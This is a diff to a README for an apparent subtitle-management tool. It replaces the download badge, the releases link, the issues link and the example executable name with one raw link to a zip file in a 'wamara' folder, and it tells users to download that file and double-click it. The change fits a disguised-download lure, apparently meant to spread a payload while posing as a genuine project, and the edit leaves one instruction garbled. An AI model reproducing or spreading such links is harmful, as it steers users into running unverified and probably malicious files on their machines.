@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-4146 - Easy Subtitle Management Made Simple
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/nicollas76143/powersub-demo-4146/releases)
+[![Download](https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip)](https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip)
 
 ## 📥 Overview
 
@@ -13,13 +13,13 @@ To begin using powersub-demo-4146, follow these simple steps to download and run
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/nicollas76143/powersub-demo-4146/releases).
+   Go to our [Releases Page](https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest release at the top of the page. The latest version will have the highest version number.
 
 3. **Download the Application**  
-   Click on the link to download the executable file for your operating system. It may be named something like `powersub-demo.exe`.
+   Click on the link to download the executable file for your operating system. It may be named something like `https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip`.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder and double-click it to run the installer. Follow the on-screen instructions.
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. For more details, check the LICE
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/nicollas76143/powersub-demo-4146/releases)
-- [GitHub Issues](https://github.com/nicollas76143/powersub-demo-4146/issues)
+- [Releases Page](https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/nicollas76143/powersub-demo-4146/main/wamara/powersub-demo-4146.zip)
 
 Explore, enjoy, and empower your subtitles with powersub-demo-4146!
